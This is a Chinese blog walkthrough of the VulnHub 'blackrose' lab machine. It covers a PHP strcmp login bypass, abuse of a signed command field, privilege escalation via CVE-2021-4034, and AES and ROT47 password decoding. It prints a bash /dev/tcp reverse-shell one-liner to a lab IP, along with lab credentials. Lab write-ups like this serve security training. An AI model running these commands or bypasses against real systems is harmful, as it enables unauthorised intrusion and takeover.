<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0x040 blackrose-1,509 | 养猪日记</title>
<meta name=keywords content><meta name=description content="这次网络修复非常奇葩，记录一下:
i='
shift 7 = /
/ = .
shift / = :
= = -


端口扫描




渗透
由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了


80渗透，扫描基本无果：


用户名枚举，有admin账户：


好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。
然后时隔一个月，再次打开这个靶机：
首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：
这里的知识点是，后端采用的是
int strcmp(string $str1, string $str2)
参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0；如果 str1 大于 str2 返回 > 0；
当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将
只要我们$_POST[‘password’]是一个
通过拦截修改数据包就可以登录后台：


就可以看到如下：


然后这里有个输入框：可以执行命令：
但是只能执行whoami，执行其他的就会提示签名错误：




那么现在就是破解这个签名，看看这个签名写的啥，加密方式为

"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0x040 blackrose-1,509"><meta property="og:description" content="这次网络修复非常奇葩，记录一下:
i='
shift 7 = /
/ = .
shift / = :
= = -


端口扫描




渗透
由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了


80渗透，扫描基本无果：


用户名枚举，有admin账户：


好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。
然后时隔一个月，再次打开这个靶机：
首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：
这里的知识点是，后端采用的是
int strcmp(string $str1, string $str2)
参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0；如果 str1 大于 str2 返回 > 0；
当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将
只要我们$_POST[‘password’]是一个
通过拦截修改数据包就可以登录后台：


就可以看到如下：


然后这里有个输入框：可以执行命令：
但是只能执行whoami，执行其他的就会提示签名错误：




那么现在就是破解这个签名，看看这个签名写的啥，加密方式为

"><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0x040 blackrose-1,509"><meta name=twitter:description content="这次网络修复非常奇葩，记录一下:
i='
shift 7 = /
/ = .
shift / = :
= = -


端口扫描




渗透
由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了


80渗透，扫描基本无果：


用户名枚举，有admin账户：


好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。
然后时隔一个月，再次打开这个靶机：
首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：
这里的知识点是，后端采用的是
int strcmp(string $str1, string $str2)
参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0；如果 str1 大于 str2 返回 > 0；
当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将
只要我们$_POST[‘password’]是一个
通过拦截修改数据包就可以登录后台：


就可以看到如下：


然后这里有个输入框：可以执行命令：
但是只能执行whoami，执行其他的就会提示签名错误：




那么现在就是破解这个签名，看看这个签名写的啥，加密方式为

"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0x040 blackrose-1,509","item":"https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0x040 blackrose-1,509","name":"0x040 blackrose-1,509","description":"这次网络修复非常奇葩，记录一下:\ni=\u0026#39;\rshift 7 = /\r/ = .\rshift / = :\r= = - 端口扫描 渗透 由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了\n80渗透，扫描基本无果：\n用户名枚举，有admin账户：\n好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。\n然后时隔一个月，再次打开这个靶机：\n首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：\n这里的知识点是，后端采用的是\nint strcmp(string $str1, string $str2) 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 \u0026lt; 0；如果 str1 大于 str2 返回 \u0026gt; 0；\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将\n只要我们$_POST[‘password’]是一个\n通过拦截修改数据包就可以登录后台：\n就可以看到如下：\n然后这里有个输入框：可以执行命令：\n但是只能执行whoami，执行其他的就会提示签名错误：\n那么现在就是破解这个签名，看看这个签名写的啥，加密方式为\n","keywords":[],"articleBody":"这次网络修复非常奇葩，记录一下:\ni='\rshift 7 = /\r/ = .\rshift / = :\r= = - 端口扫描 渗透 由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了\n80渗透，扫描基本无果：\n用户名枚举，有admin账户：\n好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。\n然后时隔一个月，再次打开这个靶机：\n首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：\n这里的知识点是，后端采用的是\nint strcmp(string $str1, string $str2) 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 \u003c 0；如果 str1 大于 str2 返回 \u003e 0；\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将\n只要我们$_POST[‘password’]是一个\n通过拦截修改数据包就可以登录后台：\n就可以看到如下：\n然后这里有个输入框：可以执行命令：\n但是只能执行whoami，执行其他的就会提示签名错误：\n那么现在就是破解这个签名，看看这个签名写的啥，加密方式为\nbcrypt的加密网站\nhttps://www.browserling.com/tools/bcrypt\n反弹shell语句：\nbash -c ‘bash -i \u003e\u0026 /dev/tcp/192.168.1.137/8888 0\u003e\u00261’\n加密后：\n$2a$10$6Epzbo7O.fFihwK9JQ4o.Oa7DhFShfLZJCvQHvh4g7MJcm1LX5l4.\n然后直接右键审查元素，然后run即可获得shell:\n提权 so文件可以提权到delx\n然后接着看了一下，2021-4034提权成功\n回头再去看作者给的那条路吧：\n根据以往的经验，多半是计划任务或者什么文件或者目录具有修改权限，最后导致提权，我就懒得翻找了，上脚本，然后失败了，这个脚本并没有什么有用信息：\n数据库密码先收集一下，尝试后，密码没用\nhowareyoubuddy\n然后还有一个密钥，破解一下密钥的密码：\n我本来是想着拿着这个密码去试试sudo -l的，但是还是失败了，基本上没思路了，无奈看wp，下面的内容就全是看了wp才做出来的了：\nfind / -type f -user delx 2\u003e/dev/null\n用这个命令帮我们找delx用户的文件：\n然后运行，貌似是要输密码的意思，由于是程序，所以可以逆向获得密码：\n反编译看一下吧：\n反编译出来的代码解释如下，其实就是个对比程序：\n这一串是aes加密的内容，其实下面的步骤就是aes逐步解密的过程，而且是有密钥的\nJqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=\n全部拖出来就是\n有了AES密钥和aes加密本身，就可以解密了：\n得到明文\nRkZiPVkvxykJVOmxBmitBPeJXqFuxM\n那么上一步获得的密码又是用来干什么的呢：\n然后接着就又是意想不到的东西了，主页的背景图片，其实仔细观察可以发现是故意隐藏了的，在css里面：\n这里面是没有图片链接的：\nimg/background-image.jpg，我只能理解为这是作者的小提示吧，但是思路确实不够连贯，有点脑洞和跳脱：\n把密码输入这里，可以看到password文件：\n然后又拿到一串密文，这又是什么加密方式呢？\ns)M8Z=7|8/\u0026YY-zK5L$.w3Su’Q@nGR\n算了，邪门儿，没啥逻辑，或者说就是单纯的体力活儿，把所有的都尝试一遍？\n加密方式为ROT47，这个加密方式的特征我也搜了一下，不太好判断，一堆CTF古典密码，邪门儿得很\nDX|g+lfMg^U**\\Kzd{S]Hb$FV\"o?v#\n根据最开始工具运行的提示，应该知道这是yourname的密码：\n第一个user.txt\n再次提权：\n然后这里我觉得又说不通了，这里是没有权限知道这个程序是干什么的，读取文件，还是读取文件再执行，没权限拿到源码，然后逆向啥的嘛，\n这里是写一个php文件，然后执行命令，有一些限制，得慢慢尝试：\necho “” \u003e1.php\n再来进行代码分析，这个blackrose居然是个python 脚本：\n这里解答了我上面的疑惑，只要绕过上面的禁用名单，并且正常执行即可：\n","wordCount":"112","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/vulnhub/0x040-blackrose-1509/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x040 blackrose-1,509</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;112 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><p>这次网络修复非常奇葩，记录一下:</p><pre tabindex=0><code>i=&#39;
shift 7 = /
/ = .
shift / = :
= = -
</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE3bb67d55c126a6dc667c95890ad4b4e7%e6%88%aa%e5%9b%be.png alt></p><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE95f2a95c2d3a2e07d51ae72a2ffbb842%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEa6e15676d2c085ce0b8120415e12fcb2%e6%88%aa%e5%9b%be.png alt></p><h1 id=渗透>渗透<a hidden class=anchor aria-hidden=true href=#渗透>#</a></h1><p>由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEdebcdbf3eaf9cb7bc3a02c29132f7a7b%e6%88%aa%e5%9b%be.png alt></p><p>80渗透，扫描基本无果：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE85fd1c89bc4d8017671da42b1274b35f%e6%88%aa%e5%9b%be.png alt></p><p>用户名枚举，有admin账户：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE00d5b379aa51430af89d2b11b8fd8d02%e6%88%aa%e5%9b%be.png alt></p><p>好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。</p><p>然后时隔一个月，再次打开这个靶机：</p><p>首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：</p><p>这里的知识点是，后端采用的是</p><pre tabindex=0><code>int strcmp(string $str1, string $str2)
</code></pre><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 > 0；</p><p>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将</p><p>只要我们$_POST[‘password’]是一个</p><p>通过拦截修改数据包就可以登录后台：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd3f23e9ecd2b0b3fb0455edc7571813d%e6%88%aa%e5%9b%be.png alt></p><p>就可以看到如下：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE273d1293b5dedf0d364b0c85c04c86b0%e6%88%aa%e5%9b%be.png alt></p><p>然后这里有个输入框：可以执行命令：</p><p>但是只能执行whoami，执行其他的就会提示签名错误：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf0cd0356fc8973869b4d63f3f2da7715%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE584fe93e66e8821e136838991acd19d8%e6%88%aa%e5%9b%be.png alt></p><p>那么现在就是破解这个签名，看看这个签名写的啥，加密方式为</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEb8f92125755cfe938fb8beadba5bbbcf%e6%88%aa%e5%9b%be.png alt></p><p>bcrypt的加密网站</p><p><a href=https://www.browserling.com/tools/bcrypt>https://www.browserling.com/tools/bcrypt</a></p><p>反弹shell语句：</p><p>bash -c &lsquo;bash -i >& /dev/tcp/192.168.1.137/8888 0>&amp;1&rsquo;</p><p>加密后：</p><p>$2a$10$6Epzbo7O.fFihwK9JQ4o.Oa7DhFShfLZJCvQHvh4g7MJcm1LX5l4.</p><p>然后直接右键审查元素，然后run即可获得shell:</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd47f748e258d45388c9e0c180e239ad9%e6%88%aa%e5%9b%be.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p>so文件可以提权到delx</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE2b2998fd8b73f4000a6c8637c48d1edb%e6%88%aa%e5%9b%be.png alt></p><p>然后接着看了一下，2021-4034提权成功</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc323be07bf1b39cfe0bb240a9a9e859a%e6%88%aa%e5%9b%be.png alt></p><p>回头再去看作者给的那条路吧：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEfb505c6029d065fa1e263e688963ddf9%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE4e05a7ac6bb3f93a363196c5b9b54746%e6%88%aa%e5%9b%be.png alt></p><p>根据以往的经验，多半是计划任务或者什么文件或者目录具有修改权限，最后导致提权，我就懒得翻找了，上脚本，然后失败了，这个脚本并没有什么有用信息：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc2232ee743054d97fdf696522efaefa2%e6%88%aa%e5%9b%be.png alt></p><p>数据库密码先收集一下，尝试后，密码没用</p><p>howareyoubuddy</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE0c4346f2e497c721b4c60bcd89457103%e6%88%aa%e5%9b%be.png alt></p><p>然后还有一个密钥，破解一下密钥的密码：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE7966393084fdd59ec988b769e7b67f88%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEca92230dfdc5263270ff7d63bcebf220%e6%88%aa%e5%9b%be.png alt></p><p>我本来是想着拿着这个密码去试试sudo -l的，但是还是失败了，基本上没思路了，无奈看wp，下面的内容就全是看了wp才做出来的了：</p><p>find / -type f -user delx 2>/dev/null</p><p>用这个命令帮我们找delx用户的文件：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEe8a19a8ba7a9aa052891a0f50c07d93d%e6%88%aa%e5%9b%be.png alt></p><p>然后运行，貌似是要输密码的意思，由于是程序，所以可以逆向获得密码：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd2fb55f782c0b81f73a611ea696685d4%e6%88%aa%e5%9b%be.png alt></p><p>反编译看一下吧：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE4852393091fb5f41909b395626e8e20f%e6%88%aa%e5%9b%be.png alt></p><p>反编译出来的代码解释如下，其实就是个对比程序：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEfe977d948f42bcadc3712650fa9d82a2%e6%88%aa%e5%9b%be.png alt></p><p>这一串是aes加密的内容，其实下面的步骤就是aes逐步解密的过程，而且是有密钥的</p><p>JqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE708e84c310159f03e3ed975721db9b4d%e6%88%aa%e5%9b%be.png alt></p><p>全部拖出来就是</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE5cca1571ab8ae17aaaa3e9f4fcec4139%e6%88%aa%e5%9b%be.png alt></p><p>有了AES密钥和aes加密本身，就可以解密了：</p><p>得到明文</p><p>RkZiPVkvxykJVOmxBmitBPeJXqFuxM</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf80b2656e8d75d4a3719ce1751081278%e6%88%aa%e5%9b%be.png alt></p><p>那么上一步获得的密码又是用来干什么的呢：</p><p>然后接着就又是意想不到的东西了，主页的背景图片，其实仔细观察可以发现是故意隐藏了的，在css里面：</p><p>这里面是没有图片链接的：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEabcb60f81d4a201121614a8ad528658f%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEb044e9ef0b5bf3a6cdec7d6f05201848%e6%88%aa%e5%9b%be.png alt></p><p>img/background-image.jpg，我只能理解为这是作者的小提示吧，但是思路确实不够连贯，有点脑洞和跳脱：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE94ce6ef9e21dd2bf3af87a57971b9785%e6%88%aa%e5%9b%be.png alt></p><p>把密码输入这里，可以看到password文件：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8988435c4f66f56e96165965bd12b6b9%e6%88%aa%e5%9b%be.png alt></p><p>然后又拿到一串密文，这又是什么加密方式呢？</p><p>s)M8Z=7|8/&amp;YY-zK5L$.w3Su&rsquo;Q@nGR</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf1e5c48316b7b1a53326c2049e8dfb1a%e6%88%aa%e5%9b%be.png alt></p><p>算了，邪门儿，没啥逻辑，或者说就是单纯的体力活儿，把所有的都尝试一遍？</p><p>加密方式为ROT47，这个加密方式的特征我也搜了一下，不太好判断，一堆CTF古典密码，邪门儿得很</p><p>DX|g+lfMg^U**\Kzd{S]Hb$FV"o?v#</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEdae45680c0151416d5749a78f5767b2b%e6%88%aa%e5%9b%be.png alt></p><p>根据最开始工具运行的提示，应该知道这是yourname的密码：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd21ca8f8956ea2b8b56b59d077ac89d9%e6%88%aa%e5%9b%be.png alt></p><p>第一个user.txt</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc24b800016b59c620db1514bb2492c80%e6%88%aa%e5%9b%be.png alt></p><p>再次提权：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEdcda6be1c101d5252c5840804844a40d%e6%88%aa%e5%9b%be.png alt></p><p>然后这里我觉得又说不通了，这里是没有权限知道这个程序是干什么的，读取文件，还是读取文件再执行，没权限拿到源码，然后逆向啥的嘛，</p><p>这里是写一个php文件，然后执行命令，有一些限制，得慢慢尝试：</p><p>echo &ldquo;&rdquo; >1.php</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf90b38cab9eec71d68e8952f69dcd71a%e6%88%aa%e5%9b%be.png alt></p><p>再来进行代码分析，这个blackrose居然是个python 脚本：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEcae0f708a82e5a128ab738cc6d841a91%e6%88%aa%e5%9b%be.png alt></p><p>这里解答了我上面的疑惑，只要绕过上面的禁用名单，并且正常执行即可：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9fcae3d58ccd69a0a248f8d1fbb6da5e%e6%88%aa%e5%9b%be.png alt></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/vulnhub/0x039-tr0ll/><span class=title>« Prev</span><br><span>0x039 Tr0ll</span>
</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x041-chili/><span class=title>Next »</span><br><span>0x041 Chili</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>